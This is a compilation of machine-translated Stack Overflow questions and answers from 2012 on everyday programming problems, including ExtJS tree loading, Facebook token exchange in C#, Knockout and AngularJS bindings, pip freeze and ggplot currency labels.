# java - 通过单击箭头在树 extjs 3 中加载节点

> ID：11935777
> 
> 赞同：0
> 
> 时间：2012-08-13T13:56:26.120
> 
> 标签：java, extjs, extjs4, extjs3

我创建了一个树，当单击节点时将子节点附加到树节点。最初，在加载树时，我向每个节点添加了一个虚拟子节点，以便在节点旁边可以看到一个文件夹图标和箭头，以指示它有一些子节点，当用户单击该节点时，虚拟子节点将替换为节点调用 load 函数返回

我使用以下代码将子节点附加到树节点

```
 listeners: {
   'render': function(tp){

            tp.getSelectionModel().on('selectionchange', function(tree, node){

            tp.getLoader().dataUrl = '/zport/clusterSysReg?args='+node.attributes.name;
            tp.getLoader().load(node);
            ...................... 
            ......................
            }
} 
```

到目前为止，一切都运行良好，但是添加虚拟节点会产生问题——当用户单击箭头时，节点会展开并且用户会看到虚拟节点。箭头的默认行为是展开节点。是否可以修改此行为，以便当用户单击箭头时调用**load(node)**函数并且用户可以看到树节点的实际子节点

谢谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T15:33:26.053

我想通了............像这样在**'beforeexpandnode'**事件中调用**加载（节点）**函数............

 **```
listeners: {
    'beforeexpandnode' : function(node,event){
         tree.getLoader().dataUrl = '/zport/clusterSysReg?args='+node.attributes.name;
         tree.getLoader().load(node);
         ..................
         ....................
     }
}, 
```**

# svn - 如何在 IntelliJ 中查看 Svn 详细日志

> ID：11935779
> 
> 赞同：5
> 
> 时间：2012-08-13T13:56:29.273
> 
> 标签：svn, logging, intellij-idea, message

如何在 IntelliJ 中查看 Svn 详细日志？

在“消息”选项卡下，它显示来自重定向到标准错误的 svn 服务器挂钩脚本的错误消息。如何将其查看为详细的日志消息（类似于 CVS 日志，可以在 IntelliJ 中启用）。

如果它提供查看和复制的选项，它将有助于调试。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T16:52:26.643

Intellij 配置为以`C:\Users\<user>\.IntelliJIdeaXX\system\log`.

它包含许多信息，我设法找出了其中的 svn 错误。

HIH

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-14T01:01:49.410

在 Mac 上，日志输出进入`/Users/<user>/Library/Logs/IntelliJIdea12`. 它将包含日志文件和线程转储。

# c# - 无法获得长期有效的到期令牌

> ID：11935782
> 
> 赞同：1
> 
> 时间：2012-08-13T13:56:39.070
> 
> 标签：c#, facebook, facebook-c#-sdk

我使用 Facebook C# SDK v 6 并在我的应用程序设置中启用了“删除离线访问”，在登录并获取访问令牌后，我正在尝试交换长寿命令牌（一个 60 天）我无法获得它，因为两个令牌都过期了24 小时内。

这是我的代码

登录 Facebook

```
private const string Scope = "publish_stream,manage_pages";
   FacebookClient _fb = new FacebookClient();
   var fbLoginUrl = _fb.GetLoginUrl(
                new
                {
                    client_id = AppId,
                    client_secret = Appsecret,
                    redirect_uri = RedirectUri,
                    response_type = "code",
                    scope = Scope,
                    state = state
                }); 
```

获取短期访问令牌

```
if (Request.QueryString["code"] != null)
            code = Request.QueryString["code"];
           var result = _fb.Post("oauth/access_token",
                                  new
                                  {
                                      client_id = AppId,
                                      client_secret = Appsecret,
                                      redirect_uri = RedirectUri,
                                      code = code,
                                      scope = Scope,
                                      response_type="token"
                                  }); 
```

获取长寿命访问令牌

```
 var  result1 = _fb.Post("oauth/access_token",
                                  new
                                  {
                                      client_id = AppId,
                                      client_secret = Appsecret,
                                      grant_type = "fb_exchange_token",
                                      fb_exchange_token= Session["fb_access_token"] as string
                                  }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T11:43:53.140

这会做。

```
var result = GetExtendedAccessToken("my_short_lived_old_token");
var extendedToken = result.access_token;

public dynamic GetExtendedAccessToken(string oldToken)
{
    dynamic result = new ExpandoObject();
    try
    {
        var api = new FacebookClient
        {
            AccessToken = oldToken,
            AppId = ClientID,
            AppSecret = ClientSecret
        };
        dynamic parameters = new ExpandoObject();
        parameters.grant_type = "fb_exchange_token";
        parameters.fb_exchange_token = oldToken;
        parameters.client_id = ClientID;
        parameters.client_secret = ClientSecret;
        result = api.Get("oauth/access_token", parameters);
    }
    catch (FacebookOAuthException err)
    {
        result.error = "Error";
        result.message = err.Message;
    }
    catch (Exception err)
    {
        result.error = "Error";
        result.message = err.Message;
    }
    return result;
} 
```

# jquery - Html 绑定到动态内容

> ID：11935784
> 
> 赞同：0
> 
> 时间：2012-08-13T13:56:45.930
> 
> 标签：jquery, ajax, knockout.js, observable

我有以下标记：

```
<div id="metro-hub">
    <h1 id="hub-title" data-bind="text: hubTitle" class="hub-title">@Model.HubTitle</h1>
    <div id="hubWrapper" data-root-url="/Root" data-bind="html: currentHub"></div>
</div> 
```

我正在使用 KnockoutJS 将`viewModel`JavaScript 对象绑定到视图。我还创建了一个自定义绑定来将导航连接到服务器上的站点地图。以下是我到目前为止所获得的一些片段：

```
var MetroPageViewModel = function () {
    var self = this;

    self.currentHub = ko.observable();
    self.viewPortData = ko.observable();
    self.hubTitle = ko.observable();

    self.renderHub = function (rootUrl) {
        console.log(rootUrl);
        $.ajax({
            url: '/Base/NewHub',
            type: 'get',
            data: {
                url: rootUrl
            },
            success: function (data) {
                if (data) {
                    var wrappedData = $(data);
                    var newHubContent = wrappedData.find('ul');
                    var title = wrappedData.find('input.metro-hub-title').val();
                    self.hubTitle(title);
                    self.currentHub(newHubContent); //THIS IS THE LINE THAT DOES NOT WORK
                }
            }
        });
    };

    self.initialize = function () {
        var url = $('#hubWrapper').data('root-url');
        self.renderHub(url);
    };
};

$(function () {
    var viewModel = new MetroPageViewModel();
    ko.applyBindings(viewModel);
    viewModel.initialize();
}); 
```

这是使用 Sammy.js 库根据 url 哈希进行路由的自定义绑定：

```
ko.bindingHandlers.metroHub = {
    update: function (element, valueAccessor, allBindingsAccessor, viewModel) {
        var menuItems = $(element).find('li');
        Sammy(function () {
            var $this = this;
            menuItems.each(function (index, elem) {
                $this.get('#/' + $(elem).data('link-name'), function () {
                    var numChildren = $(elem).data('num-children');
                    if (numChildren > 0) {
                       var rootUrl = (elem).data('source-url');
                       viewModel.renderHub(rootUrl);
                    } else {
                        var dataSource = $(elem).data('source-url');
                        $.ajax({
                            url: dataSource,
                            type: 'get',
                            success: function (data) {
                                if (data) {
                                    viewModel.viewPortData(data);
                                }
                            }
                        });
                    }
                });
            });
            var firstItem = menuItems[0];
            var itemRoute = '#/' + $(firstItem).data('link-name');
            $this.get('', function () { this.app.runRoute('get', itemRoute) });
        }).run();
    }
}; 
```

从服务器返回的数据如下：

```
<div><ul class="metro-menu" data-bind="metroHub: true"><li data-link-name="Home" data-num-children="0" data-source-url="/Navigation/Item1"><a href="#/Home">Home</a></li><li data-link-name="Products" data-num-children="2" data-source-url="/Navigation/Item2"><a href="#/Products">Products</a></li><li data-link-name="Services" data-num-children="0" data-source-url="/Navigation/Item3"><a href="#/Services">Services</a></li></ul>
<input class="metro-hub-title" type="hidden" value="this is a hub title"></input>
<input class="hasParentNode" type="hidden" value="False"></input>
</div> 
```

**更新：**

现在的问题是，一旦方法中的 AJAX 回调返回，自定义绑定`update`回调就不会被触发。`renderHub()`我是否需要调用某种方法来强制绑定或任何东西？

有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T13:21:47.633

也许您应该将更新绑定放在父容器上，因为该控件正在更新。

我认为更新没有触发是因为应该响应更新的旧 div 完全被新的 html 取代。

您可以通过在绑定中使用与更新相同的代码创建一个 init 函数来快速检查我是否正确。

# python - pip freeze 报告某些包的版本号而不是 git sha

> ID：11935786
> 
> 赞同：4
> 
> 时间：2012-08-13T13:56:47.843
> 
> 标签：python, git, pip

通常，当我从 git repo 中 pip install -e，然后执行“pip freeze”时，它会为我提供 git 版本信息。例如：

```
$ pip install -e git://github.com/kennethreitz/requests.git@27b55a74d7b9bd2f8c60fd0ee342bcbbf40e0a66#egg=requests-dev
$ pip freeze | grep requests
-e git://github.com/kennethreitz/requests.git@27b55a74d7b9bd2f8c60fd0ee342bcbbf40e0a66#egg=requests-dev 
```

为什么当我使用 piplint 包执行此操作时，“pip freeze”会报告版本号而不是 git 详细信息？

```
$ pip install -e git://github.com/dcramer/piplint.git@cb2752e0c9692e4df2b2b03dec3087699e90f4da#egg=piplint
$ pip freeze | grep piplint
piplint==0.1.1 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T15:39:00.737

当“pip freeze”尝试获取 vcs 后端到 piplint 时，它没有找到它，然后它将包标记为不可编辑。

看：

[https://github.com/pypa/pip/blob/develop/pip/init **.py** #L135](https://github.com/pypa/pip/blob/develop/pip/__init__.py#L135)

[https://github.com/pypa/pip/blob/develop/pip/vcs/init **.py** #L60](https://github.com/pypa/pip/blob/develop/pip/vcs/__init__.py#L60)

也许这是 pip 或 piplint setup.py 中的错误。

# iphone - 对具有范围对象的 NSMutablearray 进行排序

> ID：11935791
> 
> 赞同：0
> 
> 时间：2012-08-13T13:56:52.577
> 
> 标签：iphone, objective-c, ios

我已将范围对象添加到 NSMutable 数组，即 [{5, 12} {0, 4} {18, 10}]。现在我想按升序对这个 NSMutable 数组进行排序。我正在使用以下代码按递增顺序获取 NSMutable 数组对象。

```
 NSArray *stringIndexes = [StringIndexes copy];
        stringIndexes = [stringIndexes sortedArrayUsingSelector:@selector(compare:)];
        NSLog(@"stringIndexes..:%@",stringIndexes); 
```

但它没有提供所需的输出。如果有人知道如何对具有范围对象的 NSMutable 数组进行排序。请帮帮我。

谢谢大家。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-13T16:32:22.343

如果要向数组添加范围，请使用

```
NSValue *value = [NSValue valueWithRange:(NSRange)range]; 
```

当你想对数组进行排序时：

```
[myArray sortUsingComparator:^NSComparisonResult(NSValue *val1, NSValue *val2, BOOL *stop) {
  NSRange range1 = [val1 rangeValue];
  NSRange range2 = [val2 rangeValue];
  // you need to fine tune the test below - not sure what you want
  if(range1.location == range2.location) return NSOrderedSame;
  if(range1.location < range2.location) return NSOrderedAscending;
  if(range1.location > range2.location) return NSOrderedDescending;
  assert(!"Impossible");
  } ]; 
```

# java - 通过java控制台逐行输入

> ID：11935792
> 
> 赞同：0
> 
> 时间：2012-08-13T13:56:55.387
> 
> 标签：java, command-line, input, console

请帮我通过java控制台逐行输入。现在我只能以一行的形式提供输入。如何逐行给出多个输入？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T13:58:35.293

```
 InputStreamReader converter = new InputStreamReader(System.in);
      BufferedReader in = new BufferedReader(converter);

      String CurLine = ""; // Line read from standard in

      while (!(CurLine.equals("quit"))){
          CurLine = in.readLine();

          if (!(CurLine.equals("quit"))){
              System.out.println("You typed: " + CurLine);
          }
      } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T14:32:09.683

使用*新*的Console 类：

```
Console console = System.console();
if (console != null) {
    Scanner scanner = new Scanner(console.reader());
    while (scanner.hasNextLine()) {
        String line = scanner.nextLine();
        // Do something with your line
    }
} 
```

按`^Z`(control-Z) 结束输入，然后按`ENTER`。

它有一个警告，那就是`console`在 IDE 中可以为 null。从命令行尝试它，你应该没问题：

```
java path.to.my.MainClass 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T14:00:12.137

您需要使用 Scanner 并循环请求多次。

例如

```
Scanner stdin = new Scanner(new BufferedInputStream(System.in));
while (stdin.hasNext()) {
//Get input and do your logic.
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-13T14:09:33.600

我不确定我是否理解你的问题，但是......

```
 final List<String> inputs = new ArrayList<String>();
 final Scanner in = new Scanner(System.in);
 for (int i = 0; i < 5; i++) {
      System.out.print("> ");
      inputs.add(in.next());
 }
 System.out.println(inputs); 
```

# objective-c - 如何在具有动态“页面”数量的 ScrollView 中实现动态 UITTableViews

> ID：11935793
> 
> 赞同：0
> 
> 时间：2012-08-13T13:56:54.977
> 
> 标签：objective-c, ios

我一直在尝试实现一个界面，该界面在`UITableView`s 中显示数据，并在 a 中使用自定义`UITTableViewCell`s `ScrollView`（为了清楚起见，链接到 a `Page Control`）。

我发现了一些教程，它们展示了如何将这些功能彼此分开但不是一起实现，我并没有真正找到关于如何将几个自定义加载`UITableView`到控制器中的任何内容。我的基本方法现在归结为`UIViewController`'s内部的这个`viewDidLoad`：

```
for (int i = 0; i < 4; i++) {
    CGRect frame;
    frame.origin.x = self.scrollView.frame.size.width * i;
    frame.origin.y = 0;
    frame.size = self.scrollView.frame.size;

    SceduleTableView *sceduleTable = [[SceduleTableView alloc] initWithFrame:frame];

    [sceduleTable setDelegate:sceduleTable];
    [sceduleTable setDataSource:sceduleTable];
    [self.scrollView addSubview:sceduleTable];
} 
```

我一直在测试 4 页，但是在我解决这个问题后，这些将变成动态数量。

SceduleTableView 继承自`UITableView`并具有从本地 sqlite 数据库中获取包含对象的数组的数据源。我已经完成了所有 SceduleTableViews 为它们中的每一个加载数据的部分，但目前构建失败并返回此错误：

```
2012-08-13 15:43:18.975 basis[2055:f803] -[SceduleTableView tableView:numberOfRowsInSection:]: unrecognized selector sent to instance 0x8bc4800
2012-08-13 15:43:18.976 basis[2055:f803] *** Terminating app due to uncaught exception 'NSInvalidArgumentException', reason: '-[SceduleTableView tableView:numberOfRowsInSection:]: unrecognized selector sent to instance 0x8bc4800' 
```

该功能并没有真正做太多，但即使是 NSLog 也永远不会到达：

```
- (NSInteger)numberOfRowsInSection:(NSInteger)section
{
    NSLog(@"Should have %d rows", sceduleItems.count);
    return sceduleItems.count;
} 
```

而且我知道我尝试填充表格的数组都不是空的，而且 SceduleTableView 实例也不是零（我读到这可能是问题所在）。这些日志为每个 SceduleTableView 返回这个

```
NSLog(@"Array sceduleItems contains %d", sceduleItems.count);
NSLog(@"Trying to reload. Self = %@", self);
[self reloadData];

2012-08-13 15:49:32.183 basis[2259:f803] Array sceduleItems contains 340
2012-08-13 15:49:32.184 basis[2259:f803] Trying to reload. Self = <SceduleTableView: 0xbabb800; baseClass = UITableView; frame = (960 0; 320 440); clipsToBounds = YES; layer = <CALayer: 0x6e29660>; contentOffset: {0, 0}> 
```

我是 iOS 开发的新手，老实说，我真的不确定我的方法是否正确。非常感谢您的反馈！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T17:19:33.150

系统尝试调用该方法`tableView:numberOfRowsInSection:`。你还没有定义。你已经定义了方法`numberOfRowsInSection:`，覆盖了 UITableView 的默认实现。请不要那样做。

你应该定义

```
- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
    NSLog(@"Should have %d rows", sceduleItems.count);
    return sceduleItems.count;
} 
```

在您的数据源中。

此外，许多开发人员可能不赞成您将表视图对象用作他们自己的委托和数据源。也许您想熟悉[模型-视图-控制器](https://developer.apple.com/library/mac/#documentation/General/Conceptual/CocoaEncyclopedia/Model-View-Controller/Model-View-Controller.html)范式以获得更常用的设计替代方案。

# r - ggplot 中的欧元符号：scale 包

> ID：11935797
> 
> 赞同：8
> 
> 时间：2012-08-13T13:57:12.150
> 
> 标签：r, ggplot2

我注意到，使用该`scales`软件包，可以在轴上显示美元，使用`scales = dollar`里面的选项，例如`scale_y_log10()`. `scales = euro`似乎缺少一个选项。有没有简单的方法让我达到同样的效果？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2015-08-28T07:01:19.227

您可以使用的`prefix`和`suffix`参数`dollar_format`

例如像这样：

```
library(ggplot2)
library(scales)       
ggplot(diamonds) + geom_point(aes(x = carat, y =  price)) + 
   scale_y_continuous(labels = dollar_format(suffix = "€&quot;, prefix = "")) 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-08-13T17:14:33.013

修改 Dollar_format 并将符号更改为欧元很容易。运行它并将其放入代码中，就像您调用的那样`dollar_format`

```
euro_format <- function(largest_with_cents = 100000) {
  function(x) {
    x <- round_any(x, 0.01)
    if (max(x, na.rm = TRUE) < largest_with_cents &
        !all(x == floor(x), na.rm = TRUE)) {
      nsmall <- 2L
    } else {
      x <- round_any(x, 1)
      nsmall <- 0L
    }
    str_c("€", format(x, nsmall = nsmall, trim = TRUE, big.mark = ",", scientific = FALSE, digits=1L))
  }
} 
```

# c++ - 为什么 Visual Studio 2010 寻找 __thiscall 而不是 __cdecl 调用约定？

> ID：11935813
> 
> 赞同：2
> 
> 时间：2012-08-13T13:57:56.803
> 
> 标签：c++, visual-studio-2010, opencv, linker, calling-convention

总的来说，我正在尝试将 opencv 测试程序与我使用 64 位 Visual Studio 2010 Professional 编译的 opencv 库链接起来。一个示例错误是：

```
1>webcamtest.obj : error LNK2001: unresolved external symbol "public: virtual bool __thiscall cv::VideoCapture::isOpened(void)const " (?isOpened@VideoCapture@cv@@UBE_NXZ) 
```

问题是为什么__thiscall，当它链接的opencv_highui249.dll包含

```
Symbol name  : ?isOpened@VideoWriter@cv@@UEBA_NXZ (public: virtual bool __cdecl cv::VideoWriter::isOpened(void)const ) 
```

__cdecl 有意义，这表明该库已正确构建。链接测试程序时，正在搜索 opencv_highui249.dll，因此构建标志似乎是正确的，但显然我遗漏了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T14:32:01.303

你确定你使用的是 x64 库吗？
Microsoft 减少了 x64 中的调用约定。见[这里](http://msdn.microsoft.com/en-us/library/ms235286.aspx)。基本上一切都是现在`__fastcall`。
编译器仍然可以使用`__thiscall`，但它被忽略（[MSDN 链接](http://msdn.microsoft.com/en-us/library/ek8tkfbw.aspx)）。所以你的测试程序很好，但你的库看起来不对。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T14:19:02.147

`__thiscall`是 VS 中类成员函数的默认调用约定。也许头文件缺少说明`__cdecl`符，或者编译标志设置不正确，因此没有设置相关的#define。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T14:19:38.207

`__thiscall`是 MSVC 中类成员函数的默认值，您需要使用相同的设置编译 OpenCV，或者`__cdecl`在标头定义中显式使用。

# javascript - 发送数组 ajax.request 原型

> ID：11935815
> 
> 赞同：0
> 
> 时间：2012-08-13T13:57:57.867
> 
> 标签：javascript, prototypejs

我被困在这里通过原型 ajax.request 方法将数组发送到 PHP 脚本。

我的数组是在 javascript 端构建的：就像这样

```
attributeArray = new Array();

//This line of code is actually inside a loop 
attributeArray[id] = value;
//loop end
new Ajax.Request(reloadurl, {
    method: 'post',
    parameters: {'id[]':attributeArray},
    onComplete: function(transport) {
    $('load-map-fields').innerHTML = "";
    $('load-map-fields').innerHTML = transport.responseText;

    }
    }); 
```

在 PHP 脚本中，我得到了这个数组

```
Array ( [id] => Array ( [0] => special_price [1] => tier_price ) ) 
```

注意值的索引号`special_price`，`tier_price`它们是`0`和`1`。这些不是我传递的实际索引，无论我构造什么索引，它都会从`0`. 这对我没有用，因为我需要实际的索引 ID 以及值。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T14:00:28.997

您应该使用哈希而不是数组。喜欢

```
attributeArray = {} 
```

# php - 使用 CI 创建多文件上传表单

> ID：11935825
> 
> 赞同：0
> 
> 时间：2012-08-13T13:58:33.717
> 
> 标签：php, codeigniter, multifile-uploader

希望有人可以帮助我。

我正在开发一种表单，它允许使用 CodeIgniter 和 jQuery 上传多个文件，以使用一个上传字段启用多个文件上传。

但现在我在萤火虫中得到以下错误消息：

*未声明 HTML 文档的字符编码。如果文档包含 US-ASCII 范围之外的字符，则文档将在某些浏览器配置中呈现乱码。页面的字符编码必须在文档或传输协议中声明。*

这意味着 HTML 文档没有被清除，但我不明白出了什么问题。

我有以下控制器：

```
<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Upload extends CI_Controller {

    function Upload(){

        parent::Controller();
        $this->load->helper(array('form', 'url'));
    }

    public function index(){

        $this->load->view('includes/header');
        $this->load->view('upload');
        $this->load->view('includes/footer');
    }

    function do_upload()
    {
        $config['upload_path'] = './uploads/'; // server directory
        $config['allowed_types'] = 'gif|jpg|png'; // by extension, will check for whether it is an image
        $config['max_size']    = '1000'; // in kb
        $config['max_width']  = '1024';
        $config['max_height']  = '768';

        $this->load->library('upload', $config);
        $this->load->library('Multi_upload');

        $files = $this->multi_upload->go_upload();

        if ( ! $files )        
        {
            $error = array('error' => $this->upload->display_errors());
            $this->load->view('upload_form', $error);
        }    
        else
        {
            $data = array('upload_data' => $files);
            $this->load->view('upload_success', $data);
        }
    }
} 
```

所以我的第一个想法是我没有清除标题中的元标记，但事实并非如此：

```
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8" > 
<link href="<?=base_url();?>src/css/style.css" rel="stylesheet" type="text/css">
<script src="http://code.jquery.com/jquery-1.8.0.js"></script>
<script src="<?=base_url();?>src/js/jquery.MultiFile.js"></script>    
</head> 
```

如果我从控制器中删除上传功能，我会收到调用未定义方法 form_open_multipart 的错误

所以我不知道为什么我会得到我首先陈述的 errmsg。有人可以帮助我吗？

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T03:39:59.117

使用这个插件[http://www.plupload.com/example_queuewidget.php](http://www.plupload.com/example_queuewidget.php) ...它对我来说很好用很多次。

# javascript - jQuery对象到字符串请帮助

> ID：11935835
> 
> 赞同：0
> 
> 时间：2012-08-13T13:59:11.993
> 
> 标签：javascript, jquery

我正在创建一个像这样的 jquery 对象：

```
 htmlCode = $("<div id='"+data.layoutDescriptions[i].id+"'></div"); 
```

当我这样做时，它似乎主要缺少一些元素：

```
if(data.type == "ListView"){

    htmlCode.append("<SELECT property='"+ data.property +"' size="+ data.listProps.length +" multiple>");
    i = 0;
    while(i < data.listProps.length){

        htmlCode.append("<OPTION value='"+ i+1 +"'>"+ data.listProps[i] +"</OPTION>");
        i++;
    }
    htmlCode.append("</SELECT>");

} 
```

其中 data 是一个 Json 对象。

当我将其作为字符串执行时，它可以工作。例如，而不是

```
htmlCode.append("<OPTION value='"+ i+1 +"'>"+ data.listProps[i] +"</OPTION>"); 
```

我会做

```
htmlCode = htmlCode + "<OPTION value='"+ i+1 +"'>"+ data.listProps[i] +"</OPTION>"; 
```

我想找出缺少的东西，所以我想查看我尝试过的对象：

```
alert(JQuery.htmlCode.stringify());

alert(htmlCode.html); 
```

下界工作。

有任何想法吗？？

谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-13T14:04:03.610

你的第一行代码

```
htmlCode = $("<div id='"+data.layoutDescriptions[i].id+"'></div"); 
```

将变量声明`htmlCode`为包含单个`<div>`元素（由传递给函数的 HTML 定义）的 jQuery 对象。

你打电话时

```
htmlCode.append("<SELECT property='"+ data.property +"' size="+ data.listProps.length +" multiple>"); 
```

您将一个`<select>`元素（同样，由传递给函数的 HTML 定义）附加到该`<div>`元素的末尾，效果很好。

然而，当你打电话

```
htmlCode.append("<OPTION value='"+ i+1 +"'>"+ data.listProps[i] +"</OPTION>"); 
```

您**还将**an 附加`<option>`到`<div>`元素，**而不是**您想要的`<select>`元素。

看起来您正在尝试使用 jQuery 对象和`.append()`函数构建 HTML 字符串，但这*不是 jQuery 所做*的。jQuery 使用实际元素，它只是让您传递 HTML 来创建它们。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T14:01:28.683

要获取 DOM 元素的字符串表示形式，您可以使用[其他问题](https://stackoverflow.com/questions/2303713/how-to-serialize-dom-node-to-json)中发布的内容。

但是，使用其他答案（console.log 或 Firebug）中提供的方法似乎是更容易的选择，因为它们无需修改代码即可工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T14:03:04.770

你应该使用 Firefox/Firebug 来查看你的对象，浏览它们，改变它们，...

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-13T14:28:56.583

尝试类似：

```
if(data.type == "ListView"){
   var options;
   htmlCode.append("<SELECT property='"+ data.property +"' size="+ data.listProps.length    +" multiple></SELECT>");
   i = 0;
   while(i < data.listProps.length){

       options+="<OPTION value='"+ i+1 +"'>"+ data.listProps[i] +"</OPTION>";
       i++;
   }
   $(htmlCode).find('select').html(options);

} 
```

这是一个演示[Demo](http://jsfiddle.net/jjay225/QsFRR/)

# node.js - NodeJS 和小胡子：如何让局部工作？

> ID：11935840
> 
> 赞同：2
> 
> 时间：2012-08-13T13:59:20.533
> 
> 标签：node.js, mustache

我想将 mustache 与 node 一起使用，但由于某些原因，partials 不起作用：我已经创建了 2 个文件，`app.js`并且`test.mustache`，它们都在同一个目录中。使用`package.json`文件和 npm 我已经为这个项目安装了最新版本的 mustache。文件如下所示：

应用程序.js：

```
var mus = require('mustache');
console.log(mus.render('test.mustache: {{>test}}')); 
```

test.mustache：

```
This is a test 
```

如果我运行，`node app.js`我希望得到以下输出：`test.mustache: This is a test`，但我只是得到：`test.mustache:`。

其他 mustache 标签确实按预期工作，甚至 mustache 的 vows 测试也不会报告任何错误。

我应该怎么做才能让它正常工作？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-13T14:53:40.067

使用节点检查器，我用 Mustache 调试了上述应用程序。事实证明，Mustache 不会自动包含部分文件，这与[手册](http://mustache.github.com/mustache.5.html)所暗示的相反（向下滚动到部分文件）。相反，您总是需要手动提供部分作为 render 方法的第三个参数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-22T22:51:46.507

仅供参考，此版本的 Consolidate.js 支持部分：[https ://github.com/simov/consolidate.js](https://github.com/simov/consolidate.js)

Consolidate 使在 Express.js 中使用许多模板引擎变得容易

# sql - 将分数转换为百分比

> ID：11935847
> 
> 赞同：-4
> 
> 时间：2012-08-13T13:59:46.230
> 
> 标签：sql, vb.net, sql-server-2005

如何将学生获得的分数转换为 x% 即有两次考试。计算两次考试的某些百分比分数（比如 x% 和 Y%），以便总分为 100%

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T14:15:45.940

根据您提供的有限信息，我认为您可能会要求以下内容：

```
create table student
(
    id int,
    s_name varchar(10)
)
insert into student values (1, 'Jim')
insert into student values (2, 'Bob')
insert into student values (3, 'Jane')

create table exams
(
    id int,
    e_name varchar(10)
)
insert into exams values (1, 'Test 1')
insert into exams values (2, 'Test 2')
insert into exams values (3, 'Test 3')
insert into exams values (4, 'Test 4')

create table exam_student
(
    e_id int,
    s_id int,
    dt datetime,
    score decimal(5,2)
)
insert into exam_student values(1, 1, '2012-08-01', 65.0)
insert into exam_student values(1, 2, '2012-08-01', 85.0)
insert into exam_student values(2, 1, '2012-08-02', 75.0)
insert into exam_student values(2, 2, '2012-08-02', 42.0)

select avg(es.score) as ScorePct, s_id, s.s_name
from exam_student es
inner join exams e
    on es.e_id = e.id
inner join student s
    on es.s_id = s.id
group by s_id, s_name 
```

结果：

![在此处输入图像描述](../Images/fc92014f93946c65bb39c183bc598f70.png)

如果您提供有关您正在寻找的内容的更多详细信息，这将有助于回答您的问题。

# javascript - 如何防止 jQuery-UI 按钮集破坏 AngularJS 绑定？

> ID：11935848
> 
> 赞同：0
> 
> 时间：2012-08-13T13:59:45.750
> 
> 标签：javascript, jquery-ui, angularjs

在下面的代码中，我正在调用的事实`$(".test").buttonset();`正在破坏`{{ item.value() }}`. 我认为这与 jQuery UI 重写 DOM 有关。

```
<html ng-app>
    <head>
        <link href="https://ajax.googleapis.com/ajax/libs/jqueryui/1.7.2/themes/start/jquery-ui.css" type="text/css" rel="Stylesheet" />
        <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
        <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.8.21/jquery-ui.min.js"></script>
        <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.min.js"></script>
        <script type="text/javascript">
            function ExampleCtrl($scope, $timeout) {
                $scope.list = [
                    { name: "a", value: 5 },
                    { name: "b", value: 6 },
                    { name: "c", value: 5 },
                    { name: "d", value: 6 }
                ];

                $scope.calc = [
                    [
                        {
                            name: "a, b avg",
                            value: function() { return(($scope.list[0].value + $scope.list[1].value) / 2) }
                        },
                        {
                            name: "c, d avg",
                            value: function() { return(($scope.list[2].value + $scope.list[3].value) / 2) }
                        }
                    ]
                ];

                $timeout(function() {
                    $(".test").buttonset();
                }, 0);
            }
        </script>
    </head>
    <body ng-controller="ExampleCtrl">
        <div class="test" ng-repeat="group in calc">
            <div ng-repeat="item in group">
                <input type="radio" name="a" id="{{item.name}}" />
                <label for="{{item.name}}">{{item.name}}: {{ item.value() }}</label>
            </div>
        </div>

        <ul ng-repeat="item in list">
            <li>{{item.name}}: <input type="number" ng-model="item.value" />
        </ul>
    </body>
</html> 
```

这是一个 jsFiddle 版本：http: [//jsfiddle.net/vhLXW/](http://jsfiddle.net/vhLXW/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T15:04:02.650

控制器中的 Dom 操作不是一个好主意。您可以做的是创建一个简单的指令，它将为您完成 buttonset() 工作。它看起来像

```
directive('buttonset', function() {
    return function(scope, elm, attrs) {
      elm.buttonset();
    };
  }); 
```

在你的 html 中，你可以做

```
<div class="test" ng-repeat="group in calc" buttonset> 
```

现在您的代码不依赖于您的 html 中 class="test" 的存在。

在您的情况下发生的是 JQuery UI 正在转换 DOM。它隐藏了您的单选按钮并放入其他 html 元素（重新设置单选组的样式）。单击此新小部件时，JQuery UI 代码将该单击传播到相应的单选按钮。

如果 JQuery UI 暴露了一个事件或类似的东西，那么我们可以挂钩到那个，你可以从 Angular 调用`$scope.$apply();`. 但是，不幸的是，情况似乎并非如此（除非我弄错了）。

如果您真的需要 JQuery UI 的外观，您可以编写自己的代码（在 JQuery UI 操作 DOM 后复制粘贴特定的 HTML）。使用 JQuery UI 中的样式并编写自己的逻辑。Angular 让编写自己的逻辑变得非常容易。

* * *

## 回答 #2

> 赞同：1
> 
